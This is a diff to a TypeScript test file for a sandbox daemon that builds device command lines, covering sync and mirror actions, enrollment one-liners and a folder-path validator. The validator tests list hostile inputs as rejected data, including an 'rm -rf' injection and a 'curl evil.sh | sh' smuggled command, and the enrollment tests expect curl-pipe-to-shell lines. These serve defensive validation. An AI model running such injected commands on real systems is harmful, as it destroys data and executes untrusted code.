@@ -1,15 +1,29 @@
 import type { DeviceCommandInput } from "@intentic/sandbox-contract";
-import { DeviceCommandInputSchema } from "@intentic/sandbox-contract";
+import { DeviceCommandInputSchema, DeviceLocalDirSchema } from "@intentic/sandbox-contract";
 import { expect, test } from "vitest";
-import { DEVICE_COMMANDS, outcomeOf, streamOf, succeeded } from "./device-commands.js";
+import { type DeviceCommandFacts, DEVICE_COMMANDS, outcomeOf, streamOf, succeeded } from "./device-commands.js";
+
+// What the daemon knows when it builds a line. Only `sandboxId`, `mode` and `localDir` ever arrive from a caller; the
+// rest is this sandbox's own knowledge of itself, which is the whole reason these lines are built here.
+const facts = (over: Partial<DeviceCommandFacts> = {}): DeviceCommandFacts => ({
+    sandboxId: undefined,
+    ownSlug: "work-abc",
+    devRoot: undefined,
+    publicUrl: "https://work-abc.intentic.dev",
+    platform: "linux",
+    mode: undefined,
+    localDir: undefined,
+    pairToken: undefined,
+    ...over,
+});
 
 test("builds each action's command line from the name alone", () => {
-    expect(DEVICE_COMMANDS["mirror-off"].line(undefined)).toBe("intentic-machine sync mirror off");
-    expect(DEVICE_COMMANDS["mirror-on"].line(undefined)).toBe("intentic-machine sync mirror on");
+    expect(DEVICE_COMMANDS["mirror-off"].line(facts())).toBe("intentic-machine sync mirror off");
+    expect(DEVICE_COMMANDS["mirror-on"].line(facts())).toBe("intentic-machine sync mirror on");
 });
 
 test("scopes an action to one paired sandbox when it is given one", () => {
-    expect(DEVICE_COMMANDS["mirror-off"].line("sandbox-0738cd6b5027-intentic-dev")).toBe(
+    expect(DEVICE_COMMANDS["mirror-off"].line(facts({ sandboxId: "sandbox-0738cd6b5027-intentic-dev" }))).toBe(
         "intentic-machine sync mirror off --sandbox sandbox-0738cd6b5027-intentic-dev",
     );
 });
@@ -22,6 +36,27 @@ test("refuses a sandbox id that could be anything but an id", () => {
         expect(DeviceCommandInputSchema.safeParse(input(hostile)).success).toBe(false);
     }
     expect(DeviceCommandInputSchema.safeParse({ id: "laptop", command: "rm-rf" }).success).toBe(false);
+});
+
+// The one caller-supplied string that reaches a command line, so its shape is the guard. `$` is excluded because the
+// daemon writes `$HOME` itself when expanding a leading `~` (shellDir).
+test("accepts a folder on the device and nothing that could end the argument it sits in", () => {
+    for (const folder of ["~/work", "~", "/home/ada/work", "C:\\Users\\Ada\\work", "/home/ada/my work"]) {
+        expect(DeviceLocalDirSchema.safeParse(folder).success).toBe(true);
+    }
+    for (const hostile of [
+        '~/work"; rm -rf ~',
+        "~/work$HOME",
+        "~/work`id`",
+        "~/work; curl evil.sh | sh",
+        "~/work && id",
+        "~/work'",
+        "~/work\nrm -rf /",
+        "work",
+        "",
+    ]) {
+        expect(DeviceLocalDirSchema.safeParse(hostile).success).toBe(false);
+    }
 });
 
 // Fixture: mimics run_command's exit-line-plus-fenced-streams text; success reads only the exit line.
@@ -73,17 +108,73 @@ test("reports a failed command in the machine's words, stderr first", () => {
 
 // Also a compile check: an action added to the contract's enum with no table row fails to type-check.
 test("implements every action the contract names", () => {
-    const commands: DeviceCommandInput["command"][] = ["mirror-off", "mirror-on", "sync-pause", "sync-resume", "sync-unpair"];
+    const commands: DeviceCommandInput["command"][] = [
+        "mirror-off",
+        "mirror-on",
+        "sync-pause",
+        "sync-resume",
+        "sync-unpair",
+        "sync-install",
+        "dev-reload",
+    ];
     expect(Object.keys(DEVICE_COMMANDS).toSorted()).toEqual(commands.toSorted());
+});
+
+// The dev inner loop, run where the checkout is. The slug is this container's own, never the caller's: a reload aimed
+// at another sandbox on that machine would restart somebody else's daemon.
+test("reloads THIS sandbox from the checkout the container records, not the caller's sandbox", () => {
+    const line = DEVICE_COMMANDS["dev-reload"].line(facts({ devRoot: "/home/ada/intentic", sandboxId: "someone-else" }));
+    expect(line).toBe('sh "/home/ada/intentic"/_sandbox/sandbox/scripts/dev-reload.sh work-abc');
+});
+
+// No checkout recorded means every non-dev sandbox, where there is no script to run and no path to guess at.
+test("refuses to reload a sandbox that has no checkout behind it", () => {
+    expect(DEVICE_COMMANDS["dev-reload"].line(facts())).toBeUndefined();
+    expect(DEVICE_COMMANDS["dev-reload"].line(facts({ devRoot: "/home/ada/intentic", ownSlug: undefined }))).toBeUndefined();
+    expect(DEVICE_COMMANDS["dev-reload"].needs).toContain("dev-sandbox.sh");
+    // A build is minutes; the 20s default would kill it and report a timeout as the answer.
+    expect(DEVICE_COMMANDS["dev-reload"].timeoutMs).toBeGreaterThan(60_000);
+});
+
+// The same enrollment the card's copyable one-liner carries — script, env and single-use token — spoken in the shell
+// the device actually runs.
+test("enrolls a connected device in its own shell's dialect", () => {
+    const unix = DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", mode: "sync", localDir: "~/intentic/work" }));
+    expect(unix).toBe(
+        'curl -fsSL https://intentic.dev/sync | env SANDBOX_URL=\'https://work-abc.intentic.dev\' PAIR_TOKEN=\'pair_abc\' SYNC_DIR="$HOME/intentic/work" sh',
+    );
+    const windows = DEVICE_COMMANDS["sync-install"].line(
+        facts({ platform: "windows", pairToken: "pair_abc", mode: "sync", localDir: "C:\\Users\\Ada\\work" }),
+    );
+    expect(windows).toBe(
+        "$env:SANDBOX_URL='https://work-abc.intentic.dev'; $env:PAIR_TOKEN='pair_abc'; $env:SYNC_DIR=\"C:\\Users\\Ada\\work\"; irm https://intentic.dev/sync.ps1 | iex",
+    );
+});
+
+// Mirroring forwards ports and touches no files, so a folder must not ride along even when the card has one.
+test("sends no folder for a ports-only enrollment", () => {
+    const line = DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", mode: "mirror", localDir: "~/intentic/work" }));
+    expect(line).toBe("curl -fsSL https://intentic.dev/sync | env SANDBOX_URL='https://work-abc.intentic.dev' PAIR_TOKEN='pair_abc' sh");
+});
+
+// A device dials this sandbox by its public address; without one the install would enroll against nothing.
+test("refuses to enroll a device against a sandbox with no address to dial", () => {
+    expect(DEVICE_COMMANDS["sync-install"].line(facts({ pairToken: "pair_abc", publicUrl: "" }))).toBeUndefined();
+    expect(DEVICE_COMMANDS["sync-install"].line(facts({ mode: "sync" }))).toBeUndefined();
+    expect(DEVICE_COMMANDS["sync-install"].needs).toContain("public address");
+    // The one command that mints a credential; every other action must not, as a side effect of being run.
+    expect(DEVICE_COMMANDS["sync-install"].mints).toBe(true);
+    expect(DEVICE_COMMANDS["mirror-off"].mints).toBeUndefined();
 });
 
 // Bare acts on every sandbox the device pairs; omitting the id on sync-unpair would unpair all of them, not just turn
 // off one switch.
 test("builds each command line from the name and at most the row's own sandbox", () => {
-    expect(DEVICE_COMMANDS["sync-pause"].line("work-abc")).toBe("intentic-machine sync pause --sandbox work-abc");
-    expect(DEVICE_COMMANDS["sync-resume"].line("work-abc")).toBe("intentic-machine sync resume --sandbox work-abc");
-    expect(DEVICE_COMMANDS["sync-unpair"].line("work-abc")).toBe("intentic-machine sync uninstall --sandbox work-abc");
-    expect(DEVICE_COMMANDS["mirror-off"].line(undefined)).toBe("intentic-machine sync mirror off");
+    const row = facts({ sandboxId: "work-abc" });
+    expect(DEVICE_COMMANDS["sync-pause"].line(row)).toBe("intentic-machine sync pause --sandbox work-abc");
+    expect(DEVICE_COMMANDS["sync-resume"].line(row)).toBe("intentic-machine sync resume --sandbox work-abc");
+    expect(DEVICE_COMMANDS["sync-unpair"].line(row)).toBe("intentic-machine sync uninstall --sandbox work-abc");
+    expect(DEVICE_COMMANDS["mirror-off"].line(facts())).toBe("intentic-machine sync mirror off");
     expect(DEVICE_COMMANDS["sync-unpair"].scoped).toBe(true);
     expect(DEVICE_COMMANDS["mirror-off"].scoped).toBeUndefined();
 });
